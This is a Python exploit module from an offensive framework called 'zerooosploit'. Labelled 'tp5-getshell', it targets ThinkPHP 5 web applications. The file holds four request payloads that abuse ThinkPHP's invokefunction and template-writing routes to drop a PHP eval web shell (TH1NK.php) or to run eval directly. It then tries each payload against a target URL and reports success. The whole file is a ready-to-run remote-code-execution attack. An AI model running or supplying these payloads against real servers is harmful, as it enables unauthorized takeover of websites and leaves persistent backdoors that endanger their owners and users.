# #!/usr/bin/python
# # -*- coding:utf8 -*-
from zerooosploit.exploits import ExploitAggregate
from zerooosploit.color import *
import requests


class Zerooosploit(ExploitAggregate):

    def __init__(self):
        super(self.__class__, self).__init__()
        self.info = {
        'name': 'tp5-getshell',
        'product': 'thinkphp',
        'authors': '01sec',
        'ref': '',
        'cve': '',
        'create_date': '2019-09-18'
        }

        self.option = {
            'url': {'default': 'http://127.0.0.1:8080/'}
        }

    def exploit(self):
        url = self.get_options('url')
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0)Gecko/20100101 Firefox/60.0'}
        payload = '/index.php/?s=index/\\think\\template\\driver\\file/write&cacheFile=TH1NK.php&content=<?php @eval($_POST[1]);?>'
        payload1 = '/index.php/?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=TH1NK.php&vars[1][]=<?php @eval($_POST[1]);?>'
        payload2 = '/index.php/?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo \'<?php @eval($_POST[1]);?>\'>TH1NK.php'
        payload3 = '/index.php/?s=index/\\think\\app/invokefunction&function=assert&vars[0]=eval($_POST[1])&vars[1][]=1'

        explist = [payload, payload1, payload2, payload3]
        for i in range(len(explist)):
            vul_url = url + explist[i]
            try:
                r = requests.get(url=vul_url, headers=headers, timeout=60, allow_redirects=False, verify=False)
            except requests.exceptions.Timeout:
                print_red('[-] {0} Error: Timeout'.format(url))
                continue
            except requests.exceptions.ConnectionError:
                print_red('[-] {0} Error: ConnectionError'.format(url))
                continue
            print_red('[*] {0} Target status is {1}'.format(url, r.status_code))
            if r.status_code == 200:
                print_green('[+] Exploit succeed,{0}'.format(vul_url))
                break
            else:
                print_red('[-] {0} {1}'.format(url, r.status_code))

            print_blue('[*] Exploit completed')
